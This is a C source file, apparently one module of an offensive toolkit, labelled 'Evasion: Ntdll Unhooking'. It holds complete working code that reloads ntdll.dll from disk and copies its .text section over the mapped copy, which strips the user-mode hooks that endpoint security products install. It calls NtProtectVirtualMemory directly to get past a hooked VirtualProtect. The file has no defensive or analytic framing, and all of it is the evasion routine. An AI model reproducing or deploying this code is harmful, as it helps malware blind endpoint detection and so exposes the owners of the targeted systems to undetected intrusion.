/*
 * Evasion: Ntdll Unhooking
 *
 * Reloads a fresh copy of ntdll.dll from disk to bypass user-mode hooks.
 * Windows only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

bool jocky_unhook_ntdll(void)
{
    /* 1. Get the base address of the currently mapped ntdll */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    /* 2. Open ntdll.dll from disk as a data file */
    wchar_t winDir[MAX_PATH] = {0};
    if (!GetWindowsDirectoryW(winDir, MAX_PATH)) return false;

    wchar_t ntdllPath[MAX_PATH] = {0};
    _snwprintf(ntdllPath, MAX_PATH, L"%s\\System32\\ntdll.dll", winDir);

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    /* 3. Allocate a temporary buffer and read the file */
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* freshNtdll = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!freshNtdll) {
        CloseHandle(hFile);
        return false;
    }

    DWORD read = 0;
    if (!ReadFile(hFile, freshNtdll, fileSize, &read, NULL) || read != fileSize) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return false;
    }
    CloseHandle(hFile);

    /* 4. Parse the fresh copy's headers to find .text section */
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)freshNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(freshNtdll + dosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);

    BYTE* diskText = NULL;
    DWORD textSize = 0;
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            diskText = freshNtdll + sec[i].PointerToRawData;
            textSize = sec[i].SizeOfRawData;
            break;
        }
    }

    if (!diskText || textSize == 0) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return false;
    }

    /* 5. Locate the .text section in the currently mapped ntdll */
    BYTE* mappedNtdll = (BYTE*)hNtdll;
    PIMAGE_DOS_HEADER mapDos = (PIMAGE_DOS_HEADER)mappedNtdll;
    PIMAGE_NT_HEADERS mapNt = (PIMAGE_NT_HEADERS)(mappedNtdll + mapDos->e_lfanew);
    PIMAGE_SECTION_HEADER mapSec = IMAGE_FIRST_SECTION(mapNt);

    BYTE* memText = NULL;
    for (WORD i = 0; i < mapNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(mapSec[i].Name, ".text", 5) == 0) {
            memText = mappedNtdll + mapSec[i].VirtualAddress;
            break;
        }
    }

    if (!memText) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return false;
    }

    /* 6. Change memory protection to RWX, copy fresh .text, restore RX */
    ULONG oldProtect = 0;
    SIZE_T size = textSize;

    /* Use NtProtectVirtualMemory directly to avoid hook on VirtualProtect */
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    pNtProtectVirtualMemory NtProtectVirtualMemory =
        (pNtProtectVirtualMemory)GetProcAddress(hNt, "NtProtectVirtualMemory");

    if (!NtProtectVirtualMemory) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return false;
    }

    PVOID base = memText;
    NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &base, &size,
                                              PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0) {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return false;
    }

    memcpy(memText, diskText, textSize);

    base = memText;
    size = textSize;
    NtProtectVirtualMemory(GetCurrentProcess(), &base, &size,
                           oldProtect, &oldProtect);

    VirtualFree(freshNtdll, 0, MEM_RELEASE);
    return true;
}

#endif /* _WIN32 */
